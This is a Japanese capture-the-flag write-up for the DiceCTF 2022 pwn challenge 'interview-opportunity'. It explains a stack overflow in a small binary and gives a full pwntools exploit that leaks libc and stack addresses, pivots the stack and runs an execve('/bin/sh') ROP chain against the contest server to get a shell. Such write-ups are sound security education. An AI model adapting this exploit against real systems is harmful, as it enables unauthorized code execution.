---
layout: chall
ctf_name: DiceCTF_2022
problem_name: interview-opportunity
genre: pwn
solved_date: 2022-02-05
during_ctf: true
tag: [rop, warmup]
---

### 概要

バイナリのみ渡される。自明な bof があり、30 bytes 程度の rop chain が書き込める。

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>コード</summary>

```c
int main() {
  char buf[34];
  read(0, buf, 70);
}
```

</details>


### 解法

puts(puts) で libc のアドレスリークをした後、`rbp` を書き込み可能領域に設定してから `read` を呼ぶ直前に rop で飛ばす。こうすることで、70 byte のデータを既知のアドレスに書き込める。これは `execve` の rop を入れるのに十分な大きさなので、これを書き込む。そして、次の rop で stack pivot をすればよい。

<details><summary>スクリプト</summary>

```py
from pwn import *

BIN_NAME = 'interview-opportunity'
REMOTE_ADDR = 'mc.ax'
REMOTE_LIBC_PATH = 'libc.so.6'
REMOTE_PORT = 31081
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def send_rop(chain):
    if LOCAL is None: return
    assert len(chain) + 34 <= 70, str(34 + len(chain))
    stream.sendline(b'\x00' * 34 + chain)
    stream.recvuntil(b'\n\n')

rop = ROP(chall)
rop.call('puts', [chall.got["puts"]])
rop.call('main', [])
send_rop(rop.chain())
puts_addr = unpack(stream.recvline(keepends=False), "all")

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so' if LOCAL else REMOTE_LIBC_PATH)
libc.address = puts_addr - libc.symbols["puts"]
print(f'{hex(libc.address)=}')

rop = ROP(chall)
rop.call('puts', [libc.symbols["environ"]])
rop.call('main', [])
send_rop(rop.chain())
stack_addr = unpack(stream.recvline(keepends=False), "all")
print(f'{hex(stack_addr)=}')

rop = ROP(chall)
rop.raw(rop.find_gadget(['pop rbp', 'ret']))
rop.raw(stack_addr - 0x80 + 0x1a)
rop.raw(0x401276)
print(rop.dump())
send_rop(rop.chain())

rop = ROP(libc)
# use int 90
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)

# use call
# rop.call('execve', [b'/bin/sh', 0])
assert len(rop.chain()) <= 70
pause()
stream.sendline(rop.chain())

stream.interactive()
```

</details>

